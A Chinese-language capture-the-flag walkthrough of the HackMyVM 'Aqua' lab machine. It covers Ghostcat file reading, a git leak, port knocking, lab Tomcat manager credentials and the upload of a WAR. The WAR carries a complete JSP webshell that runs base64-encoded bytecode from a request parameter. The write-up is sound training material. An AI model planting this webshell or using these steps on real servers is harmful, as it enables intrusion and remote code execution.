---
title: HMV-Aqua
description: 'Go into the deep sea to gain access to Atlantida.'
pubDate: 2025-12-10
image: /machine/Aqua.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux Machine
---

# 信息收集
## ip定位
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# arp-scan -l | grep "08:00:27"                                       
172.16.52.195   08:00:27:ac:48:09       PCS Systemtechnik GmbH
```

## Nmap扫描
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# nmap -Pn -sTCV -T4 172.16.52.195
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-10 17:26 EST
Nmap scan report for 172.16.52.195
Host is up (0.00039s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 00:11:32:04:42:e0:7f:98:29:7c:1c:2a:b8:a7:b0:4a (RSA)
|   256 9c:92:93:eb:1c:8f:84:c8:73:af:ed:3b:65:09:e4:89 (ECDSA)
|_  256 a8:5b:df:d0:7e:31:18:6e:57:e7:dd:6b:d5:89:44:98 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Todo sobre el Agua
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.24 seconds
```

# 8009端口
| **<font style="color:rgb(255, 255, 255);">端口</font>**<br/><font style="color:rgb(255, 255, 255);">8009</font> | **<font style="color:rgb(255, 255, 255);">服务</font>**<br/><font style="color:rgb(255, 255, 255);">AJP13</font> | **<font style="color:rgb(255, 255, 255);">版本</font>**<br/><font style="color:rgb(255, 255, 255);">Apache JServ Protocol</font> | **<font style="color:rgb(255, 255, 255);">Tomcat AJP 反向代理远程文件包含漏洞 (Ghostcat CVE-2020-1938)</font>** |
| --- | --- | --- | --- |


```bash
┌──(root㉿kali)-[/home/kali/Desktop/tools/Ghostcat]
└─# python ajpShooter.py http://172.16.52.195:8080/ 8009 /WEB-INF/web.xml read

/home/kali/Desktop/tools/Ghostcat/ajpShooter.py:363: SyntaxWarning: invalid escape sequence '\ '
  /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1227-1472673232000"
[<] Last-Modified: Wed, 31 Aug 2016 19:53:52 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1227

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

使用ajpShooter成功获得敏感信息

读了半天只读出个这玩意

# 80端口
## 目录枚举
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# dirsearch -u http://172.16.52.195  
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                        
 (_||| _) (/_(_|| (_| )                                                                                 
                                                                                                        
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/hmv/aqua/reports/http_172.16.52.195/_25-12-10_17-45-04.txt

Target: http://172.16.52.195/

[17:45:13] 301 -  312B  - /css  ->  http://172.16.52.195/css/               
[17:45:16] 301 -  312B  - /img  ->  http://172.16.52.195/img/               
[17:45:23] 200 -   33B  - /robots.txt                                       
[17:45:24] 403 -  278B  - /server-status                                    
[17:45:24] 403 -  278B  - /server-status/  

```

## robots.txt
```bash
User-Agent: *
Disalow: /SuperCMS
```

## /SuperCMS
访问![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765350281344-957d2f19-58da-4ef2-92f8-ac9a0f691f2e.png)

仅仅得到一张图片，直接目录扫描

### 目录扫描
```bash
──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# dirsearch -u http://172.16.52.195/SuperCMS/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                               
 (_||| _) (/_(_|| (_| )                                                        
                                                                               
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/Desktop/hmv/aqua/reports/http_172.16.52.195/_SuperCMS__25-12-10_17-49-14.txt

Target: http://172.16.52.195/

[17:49:14] Starting: SuperCMS/                                                 
[17:49:14] 301 -  320B  - /SuperCMS/js  ->  http://172.16.52.195/SuperCMS/js/
[17:49:15] 301 -  322B  - /SuperCMS/.git  ->  http://172.16.52.195/SuperCMS/.git/
[17:49:15] 200 -  420B  - /SuperCMS/.git/branches/                          
[17:49:15] 200 -  607B  - /SuperCMS/.git/
[17:49:15] 200 -  257B  - /SuperCMS/.git/config                             
[17:49:15] 200 -   73B  - /SuperCMS/.git/description
[17:49:15] 200 -  644B  - /SuperCMS/.git/hooks/                             
[17:49:15] 200 -   21B  - /SuperCMS/.git/HEAD
[17:49:15] 200 -  620B  - /SuperCMS/.git/index                              
[17:49:15] 200 -  466B  - /SuperCMS/.git/info/
[17:49:15] 200 -  240B  - /SuperCMS/.git/info/exclude                       
[17:49:15] 200 -  488B  - /SuperCMS/.git/logs/                              
[17:49:15] 301 -  332B  - /SuperCMS/.git/logs/refs  ->  http://172.16.52.195/SuperCMS/.git/logs/refs/
[17:49:15] 301 -  347B  - /SuperCMS/.git/logs/refs/remotes/origin  ->  http://172.16.52.195/SuperCMS/.git/logs/refs/remotes/origin/
[17:49:15] 301 -  338B  - /SuperCMS/.git/logs/refs/heads  ->  http://172.16.52.195/SuperCMS/.git/logs/refs/heads/
[17:49:15] 301 -  340B  - /SuperCMS/.git/logs/refs/remotes  ->  http://172.16.52.195/SuperCMS/.git/logs/refs/remotes/
[17:49:15] 200 -  176B  - /SuperCMS/.git/logs/refs/remotes/origin/HEAD      
[17:49:15] 200 -  176B  - /SuperCMS/.git/logs/HEAD
[17:49:15] 200 -  480B  - /SuperCMS/.git/refs/
[17:49:15] 301 -  333B  - /SuperCMS/.git/refs/heads  ->  http://172.16.52.195/SuperCMS/.git/refs/heads/
[17:49:15] 200 -  659B  - /SuperCMS/.git/objects/
[17:49:15] 200 -  112B  - /SuperCMS/.git/packed-refs
[17:49:15] 301 -  335B  - /SuperCMS/.git/refs/remotes  ->  http://172.16.52.195/SuperCMS/.git/refs/remotes/
[17:49:15] 301 -  342B  - /SuperCMS/.git/refs/remotes/origin  ->  http://172.16.52.195/SuperCMS/.git/refs/remotes/origin/
[17:49:15] 200 -   30B  - /SuperCMS/.git/refs/remotes/origin/HEAD
[17:49:15] 301 -  332B  - /SuperCMS/.git/refs/tags  ->  http://172.16.52.195/SuperCMS/.git/refs/tags/                          
[17:49:26] 301 -  321B  - /SuperCMS/css  ->  http://172.16.52.195/SuperCMS/css/
[17:49:30] 301 -  321B  - /SuperCMS/img  ->  http://172.16.52.195/SuperCMS/img/
[17:49:31] 200 -  464B  - /SuperCMS/js/                                     
[17:49:32] 200 -  779B  - /SuperCMS/login.html                              
[17:49:38] 200 -   37B  - /SuperCMS/README.md  
```

### login.html
![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765350575130-8a2f43d0-28e6-4a99-87e0-20f4815282d2.png)





没啥思路

## Git泄露
```bash
┌──(root㉿kali)-[/home/…/Desktop/hmv/aqua/172.16.52.195]
└─#  githacker --url http://172.16.52.195/SuperCMS/.git/ --output-folder result

┌──(root㉿kali)-[/home/…/aqua/172.16.52.195/result/60874c11d6e26a35aec2178ca897434a]
└─# git log                            
commit 2e6cd2656d4e343dbcbc0e59297b9b217656c3a4 (HEAD -> main, origin/main, origin/HEAD)
Author: aquilino <hidro23@hotmail.com>
Date:   Fri Oct 1 09:59:53 2021 +0200

    Add files via upload

commit c3e76fb1f1bd32996e2549c699b0a4fa528e9a0d
Author: aquilino <hidro23@hotmail.com>
Date:   Fri Oct 1 09:50:16 2021 +0200

    Delete login.html

commit ac5bbd68afc5dc0d528f8e72daf14ab547c4b55a
Author: aquilino <hidro23@hotmail.com>
Date:   Thu Sep 30 13:43:50 2021 +0200

    Update index.html

commit f159677b7a6fb9090d9f8ba957e7e8a46f5b6df3
Author: aquilino <hidro23@hotmail.com>
Date:   Thu Sep 30 13:42:21 2021 +0200

    Update README.md

commit 8cb735a8c51987448f9386406933d0a147a1cb3f
Author: aquilino <hidro23@hotmail.com>
Date:   Fri Jun 18 16:47:50 2021 +0200

    Add files via upload

commit 3b7e4b8bb0eeb8557fc3ab0b9e7acec16431150a
Author: aquilino <hidro23@hotmail.com>
Date:   Thu Jun 17 13:08:43 2021 +0200

    Delete knocking_on_Atlantis_door.txt
    
    Arthur, has perdido tu oportunidad

commit 58afe63a1cd28fa167b95bcff50d2f6f011337c1
Author: aquilino <hidro23@hotmail.com>
Date:   Thu Jun 17 12:59:05 2021 +0200

    Create knocking_on_Atlantis_door.txt
    
    Las Puertas del avismo

commit 7b1614729157e934673b9b90ac71a2007cbf2190
Author: aquilino <hidro23@hotmail.com>
Date:   Thu Jun 17 12:57:40 2021 +0200

    Initial commit
(END)
```

### knocking_on_Atlantis_door.txt
```bash
┌──(root㉿kali)-[/home/…/aqua/172.16.52.195/result/60874c11d6e26a35aec2178ca897434a]
└─# git show 58afe63a1cd28fa167b95bcff50d2f6f011337c1
commit 58afe63a1cd28fa167b95bcff50d2f6f011337c1
Author: aquilino <hidro23@hotmail.com>
Date:   Thu Jun 17 12:59:05 2021 +0200

    Create knocking_on_Atlantis_door.txt
    
    Las Puertas del avismo

diff --git a/knocking_on_Atlantis_door.txt b/knocking_on_Atlantis_door.txt
new file mode 100644
index 0000000..84cdd81
--- /dev/null
+++ b/knocking_on_Atlantis_door.txt
@@ -0,0 +1,2 @@
+Para abrir  las puertas esta es la secuencia
+(☞ﾟヮﾟ)☞ 1100,800,666 ☜(ﾟヮﾟ☜)

要打开大门，这是顺序：1100，800，666                     
```

也就是说：  
目标主机隐藏了某个服务（比如 SSH、后台、数据库），需要按顺序访问三个端口：1100 → 800 → 666 才会开放真正的端口。

这 100% 是 Port Knocking 机制。



### Knock
```bash
knock 172.16.52.195 1100 800 666 -v
```

# 二次信息收集
## Nmap扫描
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# nmap -Pn -sTCV -T4 172.16.52.195
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-10 18:45 EST
Nmap scan report for 172.16.52.195
Host is up (0.0018s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.16.55.179
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 1048576
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jun 30  2021 pub
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 00:11:32:04:42:e0:7f:98:29:7c:1c:2a:b8:a7:b0:4a (RSA)
|   256 9c:92:93:eb:1c:8f:84:c8:73:af:ed:3b:65:09:e4:89 (ECDSA)
|_  256 a8:5b:df:d0:7e:31:18:6e:57:e7:dd:6b:d5:89:44:98 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Todo sobre el Agua
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/8.5.5
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.82 seconds
```

可以看见多开放了一个21端口

## FTP匿名登录
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# ftp 172.16.52.195  
Connected to 172.16.52.195.
220 (vsFTPd 3.0.3)
Name (172.16.52.195:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> pwd
Remote directory: /
ftp> cd pub
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||30960|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jun 30  2021 .
drwxr-xr-x    3 0        0            4096 Feb 03  2021 ..
-rw-r--r--    1 0        0            1250 Feb 03  2021 .backup.zip
```

## 压缩包解压
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# 7z x backup.zip   


7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 1250 bytes (2 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 1250

    
Enter password (will not be echoed):
```

需要输入密码

## 压缩包密码解密
view-source:[http://172.16.52.195/](http://172.16.52.195/)

```bash
<!DOCTYPE html>

<html>
	<head>
	    <meta charset="utf-8">
	    <title>Todo sobre el Agua</title>
	    <link href="https://fonts.googleapis.com/css?family=Lobster" rel="stylesheet">
	    <link rel="stylesheet" href="css/main.css" />
	</head>
	<body>
	<header class="header content">
		<div class="header-video">
			<video src="img/video.mp4" autoplay loop muted></video/>
		</div>
	
		<div class="header-overlay"></div>	
		
		<div class="header-content">
			<h1> El agua (del latín aqua)</h1>
			<p> El (agua)1 es una sustancia cuya molécula está compuesta por dos átomos de hidrógeno y uno de oxígeno (H2O)2. El término agua, generalmente, se refiere a la sustancia en su estado líquido, aunque esta puede hallarse en su forma sólida, llamada hielo, y en su forma gaseosa, denominada vapor.Es una sustancia bastante común en la Tierra y el sistema solar, donde se encuentra principalmente en forma de vapor o de hielo. Es indispensable para el origen y supervivencia de la gran mayoría de formas de vida conocidas.
			</p>
				
			<p>El agua recubre el 71 % de la superficie de la corteza terrestre.Se localiza principalmente en los océanos, donde se concentra el 96,5 % del agua total. A los glaciares y casquetes polares les corresponde el 1,74 %, mientras que los depósitos subterráneos (acuíferos), los permafrost y los glaciares continentales concentran el 1,72 %. El restante 0,04 % se reparte en orden decreciente entre lagos, humedad del suelo, atmósfera, embalses, ríos y seres vivos.El agua circula constantemente en un ciclo de evaporación o transpiración (evapotranspiración), precipitación y desplazamiento hacia el mar. Los vientos la transportan en las nubes, como vapor de agua, desde el mar, y en sentido inverso tanta agua como la que se vierte desde los ríos en los mares, en una cantidad aproximada de 45 000 km³ al año. En tierra firme, la evaporación y transpiración contribuyen con 74 000 km³ anuales, por lo que las precipitaciones totales son de 119 000 km³ cada año.
			</p>

			<p> Se estima que aproximadamente el 70 % del agua dulce se destina a la agricultura.El agua en la industria absorbe una media del 20 % del consumo mundial, empleándose en tareas de refrigeración, transporte y como disolvente en una gran variedad de procesos industriales. El consumo doméstico absorbe el 10 % restante. El acceso al agua potable se ha incrementado durante las últimas décadas en prácticamente todos los países.8​9​ Sin embargo, estudios de la FAO estiman que uno de cada cinco países en vías de desarrollo tendrá problemas de escasez de agua antes de 2030; en esos países es vital un menor gasto de agua en la agricultura, modernizando los sistemas de riego.
			</p>
			<a href="#" class="btn">about</a>
			<a href="#" class="btn">contact</a>
		</div>
	</header>
 </body>  
</html>

```

(agua)1  (H2O)2 



真阴间啊

view-source:[http://172.16.52.195/SuperCMS/](http://172.16.52.195/SuperCMS/)

源码最底下有

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765354891299-554327ae-fff8-44e7-b15e-1e2b3f953882.png)

<!-- MT0yID0gcGFzc3dvcmRfemlwCg==-->

base64解密

1=2 = password_zip

进行解压

密码为

agua=H2O

## tomcat-users


```bash
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
        <role rolename="manager-gui"/>
        <role rolename="admin-gui"/>
        <user username="aquaMan" password="P4st3lM4n" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

# 8080端口
Apache Tomcat 8.5.5

username="aquaMan" password="P4st3lM4n"

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765355505960-2c9c6aa1-cbbb-496f-a0d9-87b8ea51dcfb.png)

在 Manager 的 Deploy → WAR file to upload 这里上传你自己的 WAR 包即可

```bash
<%!

    class U extends ClassLoader {

        U(ClassLoader c) {

            super(c);

        }

        public Class g(byte[] b) {

            return super.defineClass(b, 0, b.length);

        }

    }

 

    public byte[] base64Decode(String str) throws Exception {

        try {

            Class clazz = Class.forName("sun.misc.BASE64Decoder");

            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);

        } catch (Exception e) {

            Class clazz = Class.forName("java.util.Base64");

            Object decoder = clazz.getMethod("getDecoder").invoke(null);

            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);

        }

    }

%>

<%

    String cls = request.getParameter("hack");

    if (cls != null) {

        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);

    }

%>
```

```bash
mkdir exp && cp exp.jsp exp/ && jar -cvf exp.war -C exp .
生成的文件：
exp.war
```

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765357235163-421d2ec6-256f-47aa-a261-2f9a031f9faf.png)

# tomcat提权
## ps进程
```bash
tomcat:/) $ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  0.8 159712  8992 ?        Ss   06:34   0:14 /sbin/init maybe-ubiquity
root         2  0.0  0.0      0     0 ?        S    06:34   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   06:34   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   06:34   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    06:34   0:03 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    06:34   0:01 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    06:34   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    06:34   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    06:34   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    06:34   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    06:34   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   06:34   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    06:34   0:00 [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    06:34   0:00 [kauditd]
root        17  0.0  0.0      0     0 ?        S    06:34   0:00 [khungtaskd]
root        18  0.0  0.0      0     0 ?        S    06:34   0:00 [oom_reaper]
root        19  0.0  0.0      0     0 ?        I<   06:34   0:00 [writeback]
root        20  0.0  0.0      0     0 ?        S    06:34   0:00 [kcompactd0]
root        21  0.0  0.0      0     0 ?        SN   06:34   0:00 [ksmd]
root        22  0.0  0.0      0     0 ?        SN   06:34   0:00 [khugepaged]
root        23  0.0  0.0      0     0 ?        I<   06:34   0:00 [crypto]
root        24  0.0  0.0      0     0 ?        I<   06:34   0:00 [kintegrityd]
root        25  0.0  0.0      0     0 ?        I<   06:34   0:00 [kblockd]
root        26  0.0  0.0      0     0 ?        I<   06:34   0:00 [ata_sff]
root        27  0.0  0.0      0     0 ?        I<   06:34   0:00 [md]
root        28  0.0  0.0      0     0 ?        I<   06:34   0:00 [edac-poller]
root        29  0.0  0.0      0     0 ?        I<   06:34   0:00 [devfreq_wq]
root        30  0.0  0.0      0     0 ?        I<   06:34   0:00 [watchdogd]
root        34  0.0  0.0      0     0 ?        S    06:34   0:00 [kswapd0]
root        35  0.0  0.0      0     0 ?        I<   06:34   0:00 [kworker/u3:0]
root        36  0.0  0.0      0     0 ?        S    06:34   0:00 [ecryptfs-kthrea]
root        78  0.0  0.0      0     0 ?        I<   06:34   0:00 [kthrotld]
root        79  0.0  0.0      0     0 ?        I<   06:34   0:00 [acpi_thermal_pm]
root        80  0.0  0.0      0     0 ?        S    06:34   0:00 [scsi_eh_0]
root        81  0.0  0.0      0     0 ?        I<   06:34   0:00 [scsi_tmf_0]
root        82  0.0  0.0      0     0 ?        S    06:34   0:00 [scsi_eh_1]
root        83  0.0  0.0      0     0 ?        I<   06:34   0:00 [scsi_tmf_1]
root        85  0.0  0.0      0     0 ?        I    06:34   0:01 [kworker/u2:3]
root        89  0.0  0.0      0     0 ?        I<   06:34   0:00 [ipv6_addrconf]
root        98  0.0  0.0      0     0 ?        I<   06:34   0:00 [kstrp]
root       115  0.0  0.0      0     0 ?        I<   06:34   0:00 [charger_manager]
root       175  0.0  0.0      0     0 ?        I<   06:34   0:00 [ttm_swap]
root       180  0.0  0.0      0     0 ?        S    06:34   0:00 [irq/18-vmwgfx]
root       213  0.0  0.0      0     0 ?        I<   06:34   0:00 [kworker/0:1H]
root       214  0.0  0.0      0     0 ?        S    06:34   0:00 [scsi_eh_2]
root       215  0.0  0.0      0     0 ?        I<   06:34   0:00 [scsi_tmf_2]
root       221  0.0  0.0      0     0 ?        I<   06:34   0:00 [kdmflush]
root       222  0.0  0.0      0     0 ?        I<   06:34   0:00 [bioset]
root       291  0.0  0.0      0     0 ?        I<   06:34   0:00 [raid5wq]
root       345  0.0  0.0      0     0 ?        S    06:34   0:00 [jbd2/dm-0-8]
root       346  0.0  0.0      0     0 ?        I<   06:34   0:00 [ext4-rsv-conver]
root       408  0.0  5.8 160228 58988 ?        S<s  06:34   0:04 /lib/systemd/systemd-journald
root       421  0.0  0.0      0     0 ?        I<   06:34   0:00 [iscsi_eh]
root       422  0.0  0.0      0     0 ?        I<   06:34   0:00 [ib-comp-wq]
root       423  0.0  0.0      0     0 ?        I<   06:34   0:00 [ib-comp-unb-wq]
root       424  0.0  0.0      0     0 ?        I<   06:34   0:00 [ib_mcast]
root       425  0.0  0.0      0     0 ?        I<   06:34   0:00 [ib_nl_sa_wq]
root       426  0.0  0.0      0     0 ?        I<   06:34   0:00 [rdma_cm]
root       430  0.0  0.1 105912  1868 ?        Ss   06:34   0:00 /sbin/lvmetad -f
root       437  0.3  0.5  47220  6052 ?        Ss   06:34   0:28 /lib/systemd/systemd-udevd
systemd+   471  0.0  0.3 141960  3328 ?        Ssl  06:34   0:00 /lib/systemd/systemd-timesyncd
root       478  0.0  0.0      0     0 ?        I<   06:34   0:00 [iprt-VBoxWQueue]
systemd+   668  0.0  0.5  80088  5448 ?        Ss   06:34   0:00 /lib/systemd/systemd-networkd
systemd+   690  0.0  0.5  70668  5292 ?        Ss   06:34   0:00 /lib/systemd/systemd-resolved
root       763  0.0  0.5  62168  5828 ?        Ss   06:34   0:00 /lib/systemd/systemd-logind
message+   765  0.0  0.4  50052  4672 ?        Ss   06:34   0:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
memcache   810  0.0  0.4 425800  4128 ?        Ssl  06:34   0:04 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
root       812  0.0  1.7 169192 17180 ?        Ssl  06:34   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog     813  0.0  0.4 267276  4904 ?        Ssl  06:34   0:00 /usr/sbin/rsyslogd -n
daemon     815  0.0  0.2  28340  2464 ?        Ss   06:34   0:00 /usr/sbin/atd -f
root       817  0.0  0.3  30112  3160 ?        Ss   06:34   0:00 /usr/sbin/cron -f
root       818  0.0  0.6 286456  6900 ?        Ssl  06:34   0:00 /usr/lib/accountsservice/accounts-daemon
root       819  0.0  0.8  32968  8284 ?        Ss   06:34   0:00 /usr/bin/python /root/server.py
root       820  0.0  0.1  95548  1680 ?        Ssl  06:34   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       833  0.0  0.4   8924  4192 ?        Ss   06:34   0:00 /usr/sbin/knockd -i enp0s3
root       950  0.0  0.2  29156  2896 ?        Ss   06:34   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       951  0.0  1.9 186044 20064 ?        Ssl  06:34   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       973  0.0  0.6  72308  6548 ?        Ss   06:34   0:00 /usr/sbin/sshd -D
root      1025  0.0  0.1  13252  1964 tty1     Ss+  06:34   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root      1026  0.0  0.6 288888  6572 ?        Ssl  06:34   0:00 /usr/lib/policykit-1/polkitd --no-debug
tomcat    1143  0.1 23.8 3228624 240712 ?      Sl   06:34   0:13 /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.awt.headless=true -Djava.security.egd=file:/dev/./urandom -Djdk.tls.ephemeralDHKeySize=2048 -Xms512M -Xmx1024M -server -XX:+UseParallelGC -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start
root      1466  0.0  1.7 340008 17544 ?        Ss   06:34   0:00 /usr/sbin/apache2 -k start
www-data  1752  0.0  1.0 344720 10676 ?        S    06:34   0:00 /usr/sbin/apache2 -k start
www-data  1756  0.0  1.0 344656 10612 ?        S    06:34   0:00 /usr/sbin/apache2 -k start
root      3323  0.0  0.0      0     0 ?        I    08:46   0:00 [kworker/u2:1]
root     11175  0.0  0.0      0     0 ?        I    08:54   0:00 [kworker/0:2]
root     16324  0.0  0.0      0     0 ?        I    08:59   0:00 [kworker/0:0]
tomcat   21309  0.0  0.0   4636   924 ?        S    09:04   0:00 /bin/sh -c cd "/";ps aux;echo 8b4a2db5a;pwd;echo 5ed6dbb6
